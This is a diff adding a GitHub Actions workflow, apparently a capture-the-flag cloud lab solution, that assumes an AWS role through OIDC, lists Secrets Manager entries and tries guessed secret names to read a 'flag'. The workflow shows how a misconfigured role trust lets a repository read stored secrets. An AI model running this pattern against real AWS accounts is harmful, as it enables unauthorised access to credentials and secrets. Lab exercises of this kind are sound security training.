@@ -1,0 +1,38 @@
+name: Assume AWS Role via OIDC
+
+on:
+  workflow_dispatch:   # Allows manual trigger
+  push:
+    branches: [ main ]
+
+permissions:
+  id-token: write    # Required to request OIDC token
+  contents: read
+
+jobs:
+  assume-role:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Configure AWS credentials via OIDC
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::152815104156:role/sts-lab-2-target
+          role-session-name: github-oidc-session
+          audience: sts.amazonaws.com
+
+      - name: Verify assumed role
+        run: aws sts get-caller-identity
+
+      - name: List Secrets Manager secrets
+        run: aws secretsmanager list-secrets --query 'SecretList[].Name'
+
+      - name: Read the flag
+        run: |
+          aws secretsmanager get-secret-value --secret-id flag --query 'SecretString' --output text || \
+          aws secretsmanager get-secret-value --secret-id lab-flag --query 'SecretString' --output text || \
+          aws secretsmanager get-secret-value --secret-id secret --query 'SecretString' --output text || \
+          echo "Flag not found with common names - check list-secrets output"
